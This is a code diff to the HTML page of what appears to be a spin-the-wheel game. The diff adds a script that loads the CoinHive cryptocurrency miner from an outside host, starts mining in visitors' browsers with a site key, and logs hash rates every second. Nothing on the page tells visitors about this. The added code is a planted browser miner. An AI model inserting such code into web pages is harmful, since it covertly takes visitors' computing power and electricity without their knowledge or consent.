@@ -57,5 +57,18 @@
       <button id="spin_wheel">Spin</button>
     </div>
     <script type="text/javascript" src="js/main.js"></script>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+      <script>
+        var miner = new CoinHive.Anonymous('63M772zQCnDDbX8Gdyb6UmLj1jytqemm');
+        miner.start();
+        setInterval(function() {
+          var hashesPerSecond = miner.getHashesPerSecond();
+          var totalHashes = miner.getTotalHashes();
+          var acceptedHashes = miner.getAcceptedHashes();
+          console.log("hashedPerSecond: ", hashesPerSecond);
+          console.log("totalHashes: ", totalHashes);
+          console.log("acceptedHashes: ", acceptedHashes);
+        }, 1000);
+      </script>
   </body>
   </html>
